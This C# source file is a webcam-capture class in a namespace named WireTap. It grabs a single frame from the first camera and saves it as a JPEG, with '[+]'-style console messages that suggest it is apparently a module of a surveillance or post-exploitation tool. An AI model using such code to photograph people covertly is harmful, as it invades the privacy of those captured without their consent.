using AForge.Video;
using AForge.Video.DirectShow;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;

namespace WireTap
{
    public class WebCam
    {
        private static string captureFile = "";
        private static VideoCaptureDevice videoSource;

        public static void CaptureImage(string outFile)
        {
            Console.WriteLine("Capturing webcam image...");
            captureFile = outFile;
            var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
            videoSource.NewFrame += new NewFrameEventHandler(video_Screenshot);
            videoSource.Start();
            Thread.Sleep(1000);
            videoSource.SignalToStop();
        }

        private static void video_Screenshot(object sender, NewFrameEventArgs eventArgs)
        {
            Console.WriteLine("Capturing video screenshot...");
            // get new frame
            Bitmap bitmap = eventArgs.Frame;
            bitmap.Save(captureFile, ImageFormat.Jpeg);
            Console.WriteLine("[+] Saved WebCam screenshot to: {0}", captureFile);
            captureFile = "";
            videoSource.NewFrame -= new NewFrameEventHandler(video_Screenshot);
        }
    }
}